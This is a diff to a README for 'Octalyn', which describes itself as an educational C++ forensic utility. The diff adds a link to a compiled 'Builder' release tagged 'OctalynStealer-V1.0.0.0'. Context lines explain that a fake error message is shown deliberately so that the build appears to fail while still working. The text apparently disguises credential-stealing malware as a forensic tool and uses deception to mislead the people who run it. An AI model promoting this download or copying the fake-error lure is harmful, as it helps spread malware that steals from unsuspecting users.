@@ -73,7 +73,9 @@ Octalyn is a **C++ forensic analysis utility**, designed for use in educational 
 
 ---
 
-## Go to the releases section to get the compiled version of the "toolkit" 
+## Go to the releases section to get the compiled (Builder) version of the "toolkit" 
+https://github.com/ZeroTrace-00/Octalyn-Forensic-Toolkit/releases/tag/OctalynStealer-V1.0.0.0
+---
 
 **NOTE**: If you see an error message don't worry it's added in other to make it look like an error occurred your Build will still work as expected ✅️
 
